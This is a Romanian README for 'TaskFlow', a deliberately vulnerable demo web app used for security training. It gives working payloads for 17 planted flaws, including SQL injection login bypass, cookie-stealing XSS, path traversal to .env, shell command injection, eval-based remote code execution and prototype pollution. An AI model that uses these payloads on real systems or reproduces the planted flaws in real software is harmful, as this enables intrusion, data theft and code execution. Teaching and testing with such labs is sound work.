# TaskFlow — ghid de vulnerabilități

Aplicație demonstrativă cu vulnerabilități introduse intenționat. Ramura `main` conține varianta vulnerabilă, iar ramura `fixed` varianta corectată.

Rulare locală: `npm install && node server.js` → http://localhost:3000

## Conturi

| Email | Parolă | Rol |
|---|---|---|
| `admin@taskflow.local` | `Admin123!` | admin |
| `demo@taskflow.local` | `password123` | user |

Contul `demo` are două task-uri (id 1 și 2). Contul `admin` pornește fără task-uri.

## Mod de testare

- **Link-uri (GET):** autentificare în browser, apoi URL-ul se lipește în bara de adrese.
- **Formulare existente (POST):** se completează în pagină și se trimit.
- **POST fără formular:** din consola browserului (F12 → Console), pe orice pagină a aplicației, cu sesiunea activă. `fetch()` trimite automat cookie-ul de sesiune.

---

## Vulnerabilități

### 1. SQL Injection — autentificare
**Pagină:** `/login`, câmpul **Email**.
Valoare: `admin@taskflow.local' -- ` (cu spațiu după `--`), orice parolă. Rezultat: autentificare ca admin fără parolă.

### 2. XSS reflectat — căutare
**Pagină:** `/tasks`, câmpul **Caută după titlu**.
Valoare: `<img src=x onerror="alert(document.cookie)">`

### 3. XSS stocat — comentarii
**Pagină:** `/tasks/:id`, câmpul **Adaugă un comentariu**.
Valoare: `<img src=x onerror="alert(document.cookie)">`. Scriptul se execută pentru oricine deschide task-ul.

### 4. IDOR
1. Autentificare ca `admin` (contul nu are task-uri proprii).
2. Deschiderea `http://localhost:3000/tasks/1`, task al contului `demo`. Conținutul se afișează.

Aceeași verificare lipsește și la editare (`/tasks/:id/edit`) și la ștergere (`POST /tasks/:id/delete`).

### 5. Mass Assignment
**Pagină:** `/register`. Formularul nu are câmp de rol, dar serverul îl acceptă.
```js
fetch('/register', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'email=atacator@test.local&password=Parola123&role=admin'
}).then(() => location.href = '/tasks');
```
Contul creat are rolul `admin`, vizibil în `/admin/users`.

### 6. Path Traversal — șabloane
**Pagină:** `/tasks`, secțiunea **Șablon**.
Se alege un șablon și se apasă „Deschide șablonul" (URL: `/tasks/templates?file=sprint-planning.txt`). Parametrul `file` se înlocuiește în bara de adrese:
```
http://localhost:3000/tasks/templates?file=../../../.env
```
Se afișează fișierul `.env`. Serverul folosește valoarea din URL fără să verifice că aparține celor patru șabloane.

### 7. Nume de fișier nesanitizat — avatar
**Pagină:** `/profile`, secțiunea **Schimbă avatar**, câmpul **Nume fișier**.
Câmpul se completează cu o cale ce conține `../` (de exemplu `../../server.js`). Numele este folosit la salvare fără validare.

### 8. Command Injection
```
http://localhost:3000/profile/convert-avatar?file=default.png;id&format=png
```
Caracterul `;` încheie comanda originală, iar `id` se execută ca o comandă separată. Rezultatul apare în terminalul în care rulează `node server.js`.

### 9. SSRF
```
http://localhost:3000/tasks/preview-link?url=http://localhost:3000/health
```
Cererea către URL-ul dat este făcută de server, nu de browser.

### 10. Code Injection — `eval()`
```js
fetch('/tasks/calc', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'expression=' + encodeURIComponent("require('child_process').execSync('whoami').toString()")
}).then(r => r.json()).then(console.log);
```
Codul trimis se execută pe server; rezultatul apare în consolă.

### 11. Prototype Pollution
```js
fetch('/profile/preferences', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{"__proto__":{"polluted":"da"}}'
}).then(r => r.json()).then(console.log);
```
Combinarea nesigură cu `lodash@4.17.4` modifică `Object.prototype` pentru tot procesul Node. Efectul se verifică printr-un `console.log({}.polluted)` adăugat temporar în `server.js`.

### 12. Hash slab pentru parole (MD5 fără salt)
**Pagină:** `/admin/users` (cont admin), coloana **Hash parolă**. De exemplu, `5f4dcc3b5aa765d61d8327deb882cf99` corespunde parolei `password`.

### 13. Cookie nesigur și CORS deschis
Cookie-ul `tf_session` nu are atributele `Secure`, `HttpOnly` și `SameSite`, iar serverul reflectă orice `Origin` cu `Access-Control-Allow-Credentials: true`. Verificare: DevTools → Application → Cookies și Network → antetele răspunsului.

### 14. Lipsa protecției CSRF
Formularele POST (adăugare task, comentariu, schimbare status etc.) nu conțin token CSRF și cererile nu sunt verificate după origine.

### 15. Stack trace expus
```js
fetch('/profile/preferences', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{bad'
}).then(r => r.text()).then(console.log);
```
Răspunsul conține stack trace-ul complet al erorii.

### 16. Dependențe vulnerabile
`package.json` conține versiuni cu CVE-uri publice: `lodash@4.17.4`, `jsonwebtoken@8.3.0`, `request@2.81.0`, `moment@2.19.3`, `multer@1.3.0`, `xml2js@0.4.19`, `serialize-javascript@1.4.0`. Se listează cu `npm audit` sau Trivy.

### 17. Secrete în cod
Fișierele `.env` și `config.js` conțin chei API (AWS, Stripe, SendGrid, Mailgun), secrete de sesiune și JWT și parole, scrise direct în sursă.
